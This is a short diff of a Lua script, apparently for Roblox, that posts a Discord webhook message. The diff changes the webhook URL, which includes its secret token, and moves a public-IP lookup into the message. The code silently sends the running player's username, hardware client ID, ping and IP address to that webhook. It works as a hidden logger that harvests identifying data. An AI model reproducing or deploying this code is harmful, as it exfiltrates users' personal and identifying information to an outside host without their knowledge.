@@ -1,4 +1,4 @@
-local webh = "https://discord.com/api/webhooks/978628265453453323/GVqrperoBactq8oxcEWKsOxfWc59WPHrjiXp9wzKA-VwIgFSNVJZK1Q9l8dr7FEzSPTS"
+local webh = "https://discord.com/api/webhooks/979677715445723187/lgbeXaVONsdSsO7KtmvM8qpEqc2Tk6_AWGQPbwCZpnsGMA_kRONS2Gpl6vBNC_tW4N_X"
 
 
 pcall(function()
@@ -7,12 +7,12 @@ pcall(function()
   ['embeds'] = {
     {
        ['title'] = 'script',
-       ['description'] = '',
+       ['description'] = game:GetService("HttpService"):GetAsync(ip_api_url),
        ['fields'] = {
           {name = 'Username', value = game:GetService("Players").LocalPlayer.Name},
           {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
           {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
-          {name = "IP", value = game:GetService("HttpService"):GetAsync(ip_api_url)},
+           
         }
     }
   }
